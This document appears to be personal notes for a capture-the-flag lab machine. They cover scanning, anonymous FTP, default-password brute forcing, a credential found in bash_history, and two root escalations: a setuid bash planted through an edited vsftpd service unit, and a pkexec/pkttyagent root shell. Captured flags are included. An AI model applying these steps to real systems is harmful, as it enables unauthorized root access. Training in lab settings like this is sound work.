@@ -1,0 +1,110 @@
+ip address:10.10.49.142
+
+Nmap:
+PORT   STATE SERVICE REASON  VERSION
+21/tcp open  ftp     syn-ack vsftpd 3.0.3
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.9.0.228
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 e2:be:d3:3c:e8:76:81:ef:47:7e:d0:43:d4:28:14:28 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC94RvPaQ09Xx+jMj32opOMbghuvx4OeBVLc+/4Hascmrtsa+SMtQGSY7b+eyW8Zymxi94rGBIN2ydPxy3XXGtkaCdQluOEw5CqSdb/qyeH+L/1PwIhLrr+jzUoUzmQil+oUOpVMOkcW7a00BMSxMCij0HdhlVDNkWvPdGxKBviBDEKZAH0hJEfexz3Tm65cmBpMe7WCPiJGTvoU9weXUnO3+41Ig8qF7kNNfbHjTgS0+XTnDXk03nZwIIwdvP8dZ8lZHdooM8J9u0Zecu4OvPiC4XBzPYNs+6ntLziKlRMgQls0e3yMOaAuKfGYHJKwu4AcluJ/+g90Hr0UqmYLHEV
+|   256 a8:82:e9:61:e4:bb:61:af:9f:3a:19:3b:64:bc:de:87 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBzKTu7YDGKubQ4ADeCztKu0LL5RtBXnjgjE07e3Go/GbZB2vAP2J9OEQH/PwlssyImSnS3myib+gPdQx54lqZU=
+|   256 24:46:75:a7:63:39:b6:3c:e9:f1:fc:a4:13:51:63:20 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ+oGPm8ZVYNUtX4r3Fpmcj9T9F2SjcRg4ansmeGR3cP
+80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+PORT      STATE SERVICE REASON  VERSION
+62337/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
+
+
+
+Info found on FTP server:
+Hey john,
+I have reset the password as you have asked. Please use the default password to login. 
+Also, please take care of the image file ;)
+- drac.
+
+==> possible usernames: john, drac
+
+user brute force to find the default password for john => pass= password
+
+
+Gobuster on 62337:
+/themes (Status: 301)
+/data (Status: 301)
+/plugins (Status: 301)
+/lib (Status: 301)
+/languages (Status: 301)
+/js (Status: 301)
+/components (Status: 301)
+/workspace (Status: 301)
+
+run the exploit;
+
+cd to drac user and ls -a
+cat .bash_history and get : mysql -u drac -p 'Th3dRaCULa1sR3aL'
+
+try to su drac => not allowed
+
+connect to ssh drac@10.10.49.142
+
+get user flag:02930d21a8eb009f6d26361b2d24a466
+
+sudo -l
+[sudo] password for drac: 
+Matching Defaults entries for drac on ide:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User drac may run the following commands on ide:
+    (ALL : ALL) /usr/sbin/service vsftpd restart
+
+    exploit service vsftpd restart to get root:
+
+    edit nano /lib/systemd/system/vsftpd.service by adding 
+    /bin/bash -c 'cp /bin/bash /tmp/root_shell; chmod +xs /tmp/root_shell' to the ExecStart param
+
+    then cd to /tmp
+
+    $ systemctl daemon-reload
+    $ sudo /usr/sbin/service vsftpd restart
+    $ ./root_shell -p
+
+    cat /root/root.txt
+    ce258cb16f47f1c66f0b0b77f4e0fb8d
+
+Privilege Escalation - Option 2
+Since drac is a member of the sudo group, we can escalate our privileges using pkexec
+pkexec allows an authorized user to execute commands as another user.
+Therefore, we could have used pkexec /bin/bash to spawn a shell as root.
+However, there is known issue that “pkexec fails in a non-graphical environment”
+https://bugs.launchpad.net/ubuntu/+source/policykit-1/+bug/1821415
+To solve this, we needed to create two SSH connections as user drac
+Following was the process:
+Opened two SSH connections as user drac
+On the first session ran – echo $$ 
+On the second session ran – pkttyagent -p {pid}
+Replaced {pid} with the output received for the echo $$ command 
+On the first session, ran – pkexec /bin/bash
+On the second session, entered the password for drac
+All done! Root shell was spawned on the first session.
+
